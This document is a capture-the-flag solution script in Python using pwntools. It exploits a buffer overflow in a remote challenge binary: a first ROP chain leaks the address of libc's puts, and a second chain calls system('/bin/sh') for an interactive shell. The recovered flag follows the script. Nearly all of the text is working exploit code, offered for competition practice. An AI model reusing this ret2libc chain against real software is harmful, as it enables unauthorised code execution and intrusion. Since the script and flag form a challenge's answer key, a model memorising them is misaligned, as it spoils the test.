# solver.py

```py
from pwn import *

r = remote('chal.pctf.competitivecyber.club', 8989)

lib = ELF('./libc.so.6')

puys_off = lib.sym['puts']

r.recvuntil(b' >> ')
r.sendline(b'1')
r.recvuntil(b' >> ')
r.sendline(b'y')
r.recvuntil(b' >> ')
r.sendline(b'A' * 38)
r.recvuntil(b' >> ')
r.sendline(b'3')
r.recvuntil(b' >> ')

pop_rdi = 0x000000000040101c  # : pop rdi; ret;

p = b'A' * 56
p += p64(pop_rdi)
p += p64(0x404020)
p += p64(0x4010C4)
p += p64(0x40141C)

r.sendline(p)

LIBC_BASE = int.from_bytes(r.recv().split()[2], byteorder='little') - puys_off
ADDR_BINSH = next(lib.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = lib.symbols['system'] + LIBC_BASE

p = b'A' * 56
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()
```

# FLAG

**`PCTF{r0p_l34k_1st!!1!_16719345}`**



